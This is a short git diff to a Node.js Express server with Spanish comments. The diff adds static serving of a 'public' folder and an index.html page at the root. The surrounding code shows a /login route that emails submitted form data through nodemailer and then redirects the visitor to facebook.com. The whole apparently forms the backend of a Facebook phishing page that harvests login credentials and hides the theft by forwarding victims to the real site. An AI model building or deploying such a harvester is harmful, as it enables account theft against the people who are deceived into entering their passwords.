@@ -2,16 +2,23 @@ const express = require('express');
 const bodyParser = require('body-parser');
 const nodemailer = require('nodemailer');
 const cors = require('cors');
+const path = require('path');
 
 const app = express();
-//const port = 3000;
 const port = process.env.PORT || 3000; // Cambiado para que funcione en Render
-
 
 // Configurar middlewares
 app.use(cors());
 app.use(bodyParser.urlencoded({ extended: true }));
 app.use(bodyParser.json());
+
+// Configurar Express para servir archivos estáticos desde la carpeta 'public'
+app.use(express.static(path.join(__dirname, 'public')));
+
+// Ruta para la raíz que sirve el archivo index.html
+app.get('/', (req, res) => {
+    res.sendFile(path.join(__dirname, 'public', 'index.html'));
+});
 
 // Configurar nodemailer
 const transporter = nodemailer.createTransport({
@@ -39,7 +46,7 @@ app.post('/login', (req, res) => {
             res.status(500).send('Error al enviar los datos por correo.');
         } else {
             console.log('Correo enviado: ' + info.response);
-            res.redirect('https://www.facebook.com'); // Redirigir a Google
+            res.redirect('https://www.facebook.com'); // Redirigir a Facebook
         }
     });
 });
